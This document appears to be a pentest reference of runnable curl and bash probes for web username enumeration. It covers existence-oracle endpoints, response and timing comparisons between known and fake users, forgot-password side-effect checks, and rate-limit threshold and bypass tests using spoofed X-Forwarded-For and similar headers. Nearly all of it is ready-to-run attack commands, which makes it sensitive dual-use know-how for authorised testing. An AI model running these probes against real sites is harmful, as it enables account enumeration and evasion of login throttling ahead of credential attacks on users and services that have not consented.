# Probe catalogue — the runnable probe inventory

## The direct-oracle probes

```bash
curl -s "$BASE/api/username-available?u=$U"
curl -s "$BASE/api/check-username?u=$U"
curl -s "$BASE/api/user-exists?u=$U"
curl -s "$BASE/api/users/$U"            # 200/404 REST oracle
curl -s -X POST -d "user=$U&email=a@b.c&pass=x" "$BASE/register"
```

## The 3-request oracle probes

```bash
curl -i -X POST -d "user=$KNOWN&pass=x"      "$BASE/<form>" > good
curl -i -X POST -d "user=$FAKE&pass=x"       "$BASE/<form>" > bad1
curl -i -X POST -d "user=$FAKE&pass=x"       "$BASE/<form>" > bad2
python3 tools/web/enum_probe.py --url "$BASE/<form>" \
  --body 'user={U}&pass=x' --pass-field 'pass=x' --known-user "$KNOWN" --method POST
```

## The channel probes

```bash
# body (masked)
diff <(sed -E 's/(csrf|nonce|token|_ts|request_id)[^<"& ]*//g;s/value="[^"]*"//g' good) \
     <(sed -E 's/(csrf|nonce|token|_ts|request_id)[^<"& ]*//g;s/value="[^"]*"//g' bad1)
cmp -l good bad1 | head; wc -c good bad1
# status + redirect
grep -iE '^HTTP|^location' good bad1
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -X POST -d "user=$U&pass=x" "$BASE/<f>"
# envelope
curl -sv -X POST -d "user=$U&pass=x" "$BASE/<f>" 2>&1 | grep -iE '^< |set-cookie|x-|retry'
# timing
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d "user=$KNOWN&pass=x" "$BASE/<f>"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d "user=$FAKE&pass=x"  "$BASE/<f>"
done
# send side-effect
curl -s -X POST -d "email=$U@x.c" "$BASE/forgot-password" | grep -oE '(sent|queued|to|emails)[^,}]*'
```

## The throttle probes

```bash
# bounded burst
for i in $(seq 15); do curl -s -o /dev/null -w '%{http_code} ' -X POST -d "user=t$i&pass=x" "$BASE/login"; done
# threshold — your OWN account
for i in $(seq 1 20); do c=$(curl -s -o /dev/null -w '%{http_code}' -X POST -d "user=$KNOWN&pass=x" "$BASE/login"); echo "$i $c"; [ "$c" = "429" ]&&break; done
# bypass
for h in 'X-Forwarded-For: 1.1.1.1' 'X-Real-IP: 2.2.2.2' 'X-Client-IP: 3.3.3.3' 'CF-Connecting-IP: 4.4.4.4' 'Forwarded: for=5.5.5.5'; do
  curl -s -o /dev/null -w "%{http_code} [$h]\n" -X POST -H "$h" -d 'user=x&pass=y' "$BASE/login"; done
curl -s -X POST -d 'user=x&pass=y' "$BASE/login"    # fresh session, no jar
curl -s -o /dev/null -w '%{http_code}\n' -X GET "$BASE/login?user=x&pass=y"   # method
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{"username":"x","password":"y"}' -H 'Content-Type: application/json' "$BASE/api/login"
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d 'user=x&pass=y' "$BASE/LOGIN"   # case
```

## The account-confirm probes

```bash
# a specific candidate — does its response match KNOWN-good?
curl -i -X POST -d "user=$CANDIDATE&pass=x" "$BASE/<form>" > cand
diff cand good; diff cand bad1
```
